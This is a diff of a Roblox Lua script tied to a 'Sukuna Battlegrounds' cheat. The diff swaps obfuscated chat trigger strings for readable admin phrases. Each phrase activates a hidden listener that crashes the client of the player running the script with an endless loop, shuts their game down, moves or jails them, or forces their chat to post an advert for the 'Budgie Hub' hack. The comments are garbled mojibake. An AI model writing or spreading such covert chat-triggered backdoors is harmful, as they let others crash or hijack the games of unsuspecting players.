@@ -1,6 +1,6 @@
 -- РѕРґРЅР° (РєРёР»Р»)
 function onChatMessage(player, message)
-    if message:lower() == "0ltqsnge0yvqstga0ldrin0ge0yvqgncyr0ldqu9go0l7qvdc80ldrgtc" then 
+    if message:lower() == "killalladminbattlegrounds" then 
         function getAllPlayers()
             local players = game:GetService("Players"):GetPlayers()
             return players
@@ -26,7 +26,7 @@ end
 
 -- РІС‚РѕСЂР°СЏ (С„РёРЅРґ)
 function onChatMessage(player, message)
-    if message:lower() == "0ljqtnc4incyinc30ldqtnc90ljrhtgdingn0ylqvidqtnc70y8g0ld" then 
+    if message:lower() == "findadminbattlegrounds" then 
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I using Budgie Hub | Best hack/script for Sukuna Battlegrounds", "All")
     end
 end
@@ -45,7 +45,7 @@ end
 
 -- С‚СЂРµС‚СЊСЏ (Р±СЂРёРЅРі)
 function onChatMessage(player, message)
-    if message:lower() == "0lhrgnc40l0g0lhrgngl0l0g0lhrjtga0ldqvsdqsdc00yvqv" then 
+    if message:lower() == "bringalladminbattlegrounds" then 
         function getAllPlayers()
             local players = game:GetService("Players"):GetPlayers()
             return players
@@ -71,7 +71,7 @@ end
 
 -- С‡РµС‚РІС‘СЂС‚Р°СЏ (РљРёРє)
 function onChatMessage(player, message)
-    if message:lower() == "0y/qu9c+0yfqvngb0ylrj9cx0yfrjngb inc80ljr " then 
+    if message:lower() == "kickalladminbattlegrounds" then 
         game:Shutdown()
     end
 end
@@ -90,7 +90,7 @@ end
 
 -- РїСЏС‚Р°СЏ (РєСЂР°С€)
 function onChatMessage(player, message)
-    if message:lower() == "0yjqs9c60yprgnc20yjqv9gj0l7qsngfmdg10lfqvjI5" then 
+    if message:lower() == "crashalladminbattlegrounds" then 
         while true do
         end
     end
@@ -110,7 +110,7 @@ end
 
 -- С€РµСЃС‚Р°СЏ (С‚СЋСЂСЊРјР°)
 function onChatMessage(player, message)
-    if message:lower() == "yxnzd29pzmfqbjtvcjgxetrwntk4mtc0nxcbm8xdxa1cmnqbm" then 
+    if message:lower() == "jailalladminbattlegrounds" then 
         function getAllPlayers()
             local players = game:GetService("Players"):GetPlayers()
             return players
@@ -136,7 +136,7 @@ end
 
 -- СЃРµРґСЊРјР°СЏ (РїСЂРµРґСѓРїСЂРµР¶РґРµРЅРёРµ)
 function onChatMessage(player, message)
-    if message:lower() == "0ljqtnc4ingi0ynrgnc50yjqtnc80ydrgtc1nnc5m9c0nnc10yexmjfq" then 
+    if message:lower() == "warnadminbattlegrounds" then 
         Fg = math.random(1, 2)
         if Fg == 1 then
             game.StarterGui:SetCore("SendNotification", {
@@ -170,7 +170,7 @@ end
 
 -- РІРѕСЃСЊРјР°СЏ (СЃРєР°СЂРё)
 function onChatMessage(player, message)
-    if message:lower() == "mdk0mzi1odfqv9c80lfrgddqt9czmdk40lprg9c1ndnq" then 
+    if message:lower() == "scaryalladminbattlegrounds" then 
         local co = Instance.new("ColorCorrectionEffect")
         co.Parent = game.Lighting
         co.Saturation = 150
